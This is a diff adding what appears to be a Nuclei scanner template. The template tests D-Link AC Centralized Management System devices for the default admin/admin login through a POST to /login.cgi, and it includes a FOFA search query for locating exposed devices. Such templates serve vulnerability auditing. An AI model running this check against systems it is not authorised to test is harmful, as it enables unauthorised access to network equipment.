@@ -1,0 +1,50 @@
+id: dlink-centralized-default-login
+
+info:
+  name: D-Link AC Centralized Management System - Default Login
+  author: SleepingBag945
+  severity: high
+  description: |
+    D-Link AC Centralized Management System default login credentials were discovered.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="AC集中管理平台" && body="D-Link路由器管理页"
+  tags: default-login,dlink,vuln
+
+http:
+  - raw:
+      - |
+        POST /login.cgi  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&password={{password}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && !contains(body_1,"flag=0")'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "ac_userid"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "window.open"
+        condition: and
+# digest: 490a0046304402207e4d0ab1678a91ef842f3187e4be481820a1d8aea15f9370aa42170e76d0669b02204a662f5f3256932f62b4b69c02e62d58621f9ea0e16494c7be3daa9e9b842d04:922c64590222798bb761d5b6d8e72950
